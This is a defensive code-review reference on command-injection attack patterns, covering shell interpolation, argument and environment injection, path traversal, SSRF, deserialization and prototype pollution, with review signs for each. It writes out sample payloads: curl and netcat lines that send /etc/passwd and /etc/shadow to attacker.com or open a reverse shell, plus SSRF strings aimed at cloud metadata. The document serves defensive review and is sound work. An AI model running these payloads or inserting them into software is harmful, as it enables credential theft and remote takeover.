# atk-command-injection.md
> Attack patterns where untrusted input causes execution of unintended OS commands, processes, or code through subprocess APIs, environment manipulation, path traversal, or unsafe deserialization.

---

## 1. Shell Interpolation (shell=True / exec with string)

**Description:** The application builds a command string by concatenating or formatting user input, then passes that string to a shell interpreter. The shell parses the entire string — metacharacters (`;`, `|`, `&&`, `$()`, backticks, `<`, `>`) in the input become operators that the shell executes.

**Vector:** Any call to a subprocess API that invokes a shell intermediary:
- `exec("cmd " + userInput)` — Node.js `child_process.exec`
- `subprocess.run(f"tool {user_input}", shell=True)` — Python
- `os.system(...)` — Python
- Any language's equivalent of "run this string in a shell"

**Impact:** Arbitrary command execution with the privileges of the application process. Classic payloads:
- `;curl attacker.com/exfil?d=$(cat /etc/passwd)` — exfiltrate files
- `&&nc -e /bin/sh attacker.com 4444` — reverse shell
- `|base64 /etc/shadow|curl -d @- attacker.com` — encoded exfiltration

**Code review signs:**
- Subprocess API calls where the first argument is a string that includes a variable or formatted value, not a fixed binary path.
- `shell=True`, `shell: true`, or equivalent option flags on process-spawning calls.
- `os.system()`, `os.popen()`, `popen()` receiving anything other than a hard-coded literal.
- Command strings built with string concatenation, format strings, or template literals.

---

## 2. Argument Injection (CWE-88)

**Description:** The subprocess is invoked without a shell (safe from metacharacter injection), but user-controlled values are passed as arguments to the child process. If those values begin with `-` or `--`, the child process's argument parser interprets them as command-line flags rather than data — enabling the attacker to activate unintended options.

**Vector:** Code that passes user input directly as positional arguments to a subprocess, without prepending `--` (the POSIX end-of-options separator) or validating that values do not start with a hyphen.

**Impact varies by target program:**
- `--output=../../etc/cron.d/evil` — write to arbitrary filesystem path
- `--config=/tmp/attacker.cfg` — load attacker-controlled configuration
- `--exec=id` — execute arbitrary commands if the target binary supports it
- `--help` / `--version` — denial of service (process exits unexpectedly)

**Code review signs:**
- Subprocess calls where user input is in the argument array without a preceding `--` separator.
- Argument parsers configured to allow abbreviations (e.g., `allow_abbrev=True`) — enables partial-match injection.
- No prefix check or regex validation stripping leading hyphens from user-supplied argument values.

**Real incident:** CVE-2024-24576 (CVSS 10.0, 2024) — "BatBadBut": Rust's `std::process::Command` on Windows implicitly re-invokes `.bat` and `.cmd` files through `cmd.exe`, causing shell metacharacter interpretation even without `shell=True`. Affected all Rust versions before 1.81.0.

---

## 3. Environment Variable Injection

**Description:** An attacker with local access (or control over a parent process) sets environment variables that modify the runtime behavior of a subprocess. If the application spawns child processes without clearing the inherited environment, attacker-controlled variables take effect.

**Critical variables:**
| Variable | OS | Effect |
|---|---|---|
| `LD_PRELOAD=/tmp/evil.so` | Linux | Loads attacker's shared library into every subprocess |
| `DYLD_INSERT_LIBRARIES=/tmp/evil.dylib` | macOS | Same as LD_PRELOAD |
| `PYTHONPATH=/tmp/evil_modules/` | All (Python) | Loads attacker's Python modules before stdlib |
| `PYTHONHOME=/tmp/fake_python/` | All (Python) | Redirects entire Python standard library |
| `PATH=/tmp/evil_bin:$PATH` | All | Substitutes attacker binaries for trusted commands |
| `HTTP_PROXY=http://attacker.com:8080` | All | Intercepts all outbound HTTP traffic |

**Vector:** Application spawns child processes (interpreted language runtimes, helper utilities) while inheriting the full environment from the OS user session, a CI/CD environment, or a container.

**Impact:** Full process hijack via library preloading, credential interception via proxy injection, arbitrary code execution via module substitution.

**Code review signs:**
- Process spawn calls without an explicit environment clear (`env_clear()`, `env={}`, or equivalent).
- No allowlist of permitted environment variables passed to child processes.
- Subprocess launch in contexts where environment variables may be user-controlled (web server handlers, CI scripts).

---

## 4. Path Traversal in File Operations

**Description:** User-supplied input used to construct a file path contains `../` sequences (or encoded equivalents: `%2e%2e%2f`, `..%2f`, URL double-encoding). The application resolves these sequences and accesses files outside the intended directory.

**Important:** `path.normalize()` and equivalent functions normalize the syntax but do not enforce a base directory — `path.normalize("../../../etc/passwd")` returns `"../../../etc/passwd"`. Safe path validation requires resolving to an absolute path and then verifying the result starts with the allowed base directory prefix.

**Symlink escape variant:** Even after resolving `..` sequences, a symlink within the allowed directory can point outside it. Safe validation must follow symlinks (e.g., `realpath()`, `fs.realpathSync()`) and re-check the resolved path against the base.

**Windows device name variant:** `CON`, `NUL`, `PRN`, `COM1` etc. bypass path checks on Windows and cause hangs or errors. Demonstrated in CVE-2025-27210 (2025).

**Impact:** Read arbitrary files (private keys, credentials, application secrets), write to arbitrary paths (cron jobs, startup scripts, configuration files), denial of service.

**Code review signs:**
- File path construction that uses user input without calling both a path resolver and a prefix membership check.
- `open()`, `readFile()`, `readFileSync()`, `File()` receiving a path that includes user-controlled segments.
- Absence of symlink resolution before the prefix check.
- No blocklist for Windows device names on cross-platform code.

---

## 5. URL / Protocol Injection (SSRF)

**Description:** User-controlled input is passed to an HTTP client, browser automation tool, or any API that fetches a URL. Beyond HTTP/HTTPS, many such APIs also support `file://`, `ftp://`, `gopher://`, `dict://`, and other schemes. The attacker uses these to access local files or internal network services.

**Vector:** Any code path that calls a URL-fetching API (HTTP client, headless browser `goto()`, image loader, webhook dispatcher) with a URL derived from user input, without scheme and host validation.

**Key payloads:**
- `file:///etc/passwd` — read local files
- `file:///proc/self/environ` — leak environment variables including API keys
- `http://169.254.169.254/latest/meta-data/` — AWS instance metadata (credentials)
- `http://127.0.0.1:port/admin` — internal service access
- `http://[::1]:8080/` — IPv6 loopback bypass
- `http://0x7f000001/` — hex-encoded loopback bypass

**Impact:** Read local files, steal cloud credentials, pivot to internal services, bypass network perimeter controls.

**Code review signs:**
- URL fetch calls where the URL or its host/path component is derived from user input.
- No scheme validation (allowlist of `https://` only, for example).
- No post-DNS-resolution IP validation against RFC1918 / loopback ranges.
- Headless browser or Playwright `page.goto()` receiving user-supplied URLs without scheme stripping.

---

## 6. Deserialization of Untrusted Data

**Description:** A serialization format capable of encoding executable constructs (object graphs, callable references, class instantiations) is deserialized from attacker-controlled input. The deserialization step reconstructs objects and may invoke constructors, magic methods, or finalizers that execute attacker-specified code.

**High-risk formats and mechanisms:**
| Format / API | Language | Risk |
|---|---|---|
| `pickle` / `unpickle` | Python | `__reduce__` can call `os.system()` — arbitrary code execution |
| `eval(userString)` | JS / any | Directly executes input as code |
| `new Function(userString)` | JavaScript | Same as `eval` — sandbox bypass is trivial |
| `YAML.load()` (not `YAML.safe_load()`) | Python | Executes Python constructors |
| Java `ObjectInputStream` | Java | Gadget chains to `Runtime.exec()` |
| PHP `unserialize()` | PHP | Magic method chains |
| `node-serialize` (npm) | Node.js | Uses `new Function()` internally for IIFE payloads |

**`JSON.parse()` is safe** — it decodes data only, with no code execution. The danger is in formats that encode object types, references, or callables.

**Impact:** Remote code execution, typically with the privileges of the process performing deserialization.

**Code review signs:**
- `pickle.loads()`, `pickle.load()` called on data from any external source (network, file, database, queue).
- `eval()` or `new Function()` receiving strings that contain externally sourced values.
- YAML loading functions other than the explicitly safe variant.
- Deserialization of binary formats from queues, sockets, or HTTP request bodies without prior authentication and signature verification.

**Real incident:** CVE-2025-55182 "React2Shell" (CVSS 10.0, 2025) — React Server Components Flight protocol deserialized untrusted POST bodies without validation, enabling unauthenticated RCE on Next.js App Router. Affected React 19.0.0–19.2.0; 39% of cloud environments contained vulnerable instances (Wiz, 2025).

---

## 7. Prototype Pollution (JavaScript / TypeScript)

**Description:** JavaScript's prototypal inheritance means that setting `object.__proto__.key = value` or `object.constructor.prototype.key = value` injects `key` into every object in the application. An attacker who controls the keys of a merge or clone operation can inject properties onto `Object.prototype`.

**Vector:** Deep-merge, recursive-assign, or clone functions that process attacker-controlled JSON without filtering reserved keys (`__proto__`, `constructor`, `prototype`).

**Impact:**
- Property injection: `{}.isAdmin === true` after pollution — privilege escalation.
- RCE via gadget chains: polluting `shell` or `input` on `Object.prototype` causes `child_process.execSync` to use attacker values — documented by PortSwigger.

**Code review signs:**
- Recursive merge/clone functions that do not filter `__proto__` and `constructor` keys.
- `Object.assign(target, userInput)` where `userInput` comes from parsed JSON.
- Libraries like `lodash.merge` called with unvalidated input on versions predating their prototype pollution patches.
- Absence of `Object.create(null)` for dictionaries intended to hold arbitrary keys.

---

## Universal Grep Patterns (language-agnostic concepts)

| What to look for | Risk |
|---|---|
| Shell-invoking subprocess call receiving a variable or formatted string | Command injection |
| Subprocess argument array containing user input without `--` separator | Argument injection |
| Process spawn without explicit environment clear | Env var injection |
| File open/read/write using a path with user-supplied segments, no prefix check | Path traversal |
| URL fetch / `goto()` with user-controlled URL, no scheme/host validation | SSRF / protocol injection |
| `pickle.loads`, `eval`, `new Function`, `YAML.load` on external data | Deserialization RCE |
| Deep-merge / recursive-assign on JSON input without key filtering | Prototype pollution |
